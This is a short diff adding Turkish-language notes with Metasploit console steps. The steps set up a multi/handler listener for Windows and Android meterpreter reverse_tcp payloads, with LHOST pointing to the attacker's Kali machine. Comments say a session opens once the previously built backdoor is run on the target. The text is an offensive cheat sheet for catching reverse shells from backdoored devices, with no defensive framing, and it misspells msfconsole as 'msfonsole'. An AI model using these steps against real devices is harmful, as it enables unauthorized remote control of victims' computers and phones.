@@ -1,0 +1,17 @@
+Metasploit:
+    (Windows)
+    ->msfonsole
+    ->use exploit/multi/handler
+    ->set payload windows/meterpreter/reverse_tcp (Backdoor'u oluştururken seçtiğimiz payload.)
+    ->show options
+    ->set LHOST <kali_ip>
+    ->set LPORT <Backdoor'u oluştururken seçtiğimiz port>
+    ->exploit (Komutu ile dinlemeye başlıyoruz.Backdoour çalıştırıldığı takdirde session açılacak.)
+
+    (Android)
+    ->msfonsole
+    ->use exploit/multi/handler
+    ->set payload android/meterpreter/reverse_tcp (Backdoor'u oluştururken seçtiğimiz payload.)
+    ->set LHOST <kali_ip>
+    ->set LPORT <Backdoor'u oluştururken seçtiğimiz port>
+    ->exploit (Komutu ile dinlemeye başlıyoruz.Backdoour çalıştırıldığı takdirde session açılacak.)
